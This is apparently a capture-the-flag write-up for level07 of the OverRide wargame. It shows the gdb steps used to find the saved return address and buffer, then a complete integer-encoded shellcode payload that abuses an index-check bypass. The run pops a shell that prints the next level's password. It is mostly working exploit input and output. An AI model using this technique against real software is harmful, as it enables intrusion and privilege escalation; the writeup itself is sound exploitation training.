@@ -1,0 +1,114 @@
+in this binary we can only write into the buffer but we can
+overflow the buffer with the read and store functions that
+don't check on input except for the stored numbers with index
+which can be divided by 3
+
+then we need to know where the saved eip is:
+
+level07@OverRide:~$ gdb level07
+(gdb) start
+Temporary breakpoint 1 at 0x8048729
+Starting program: /home/users/level07/level07
+
+Temporary breakpoint 1, 0x08048729 in main ()
+(gdb) i frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebp at 0xffffd708, eip at 0xffffd70c
+
+eip -> 0xffffd70c
+
+we need to know where the buf is located:
+
+(gdb) b read_number
+Breakpoint 2 at 0x80486dd
+(gdb) c
+Continuing.
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: read
+
+Breakpoint 2, 0x080486dd in read_number ()
+(gdb) x /wx $ebp+8
+0xffffd520:     0xffffd544
+
+we now know that it is at +9 (int addr) from the arg of the function
+so -9 to get the address
+now we need to convert a shellcode into 4 byte numbers and put them into
+but the third indexes must be added with the unsigned max int
+then we can get the address of buf and put it in eip (should not change)
+andd then quit to "release" the code
+
+
+from the script we get this code to paste in /tmp/exploit:
+"""
+store
+1750122545
+1073741824
+store
+1752379183
+1
+store
+1768042344
+2
+store
+1357089134
+1073741827
+store
+836864339
+4
+store
+2198581458
+5
+store
+2160980196
+1073741830
+read
+-9
+store
+4294956388
+1073741938
+quit
+"""
+
+("read" and "-9" anre not necessary)
+
+
+level07@OverRide:~$ cat /tmp/exploit - | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Index:  Number at data[4294967287] is 4294956388
+ Completed read command successfully
+Input command:  Number:  Index:  Completed store command successfully
+
+Input command:  Failed to do  command
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
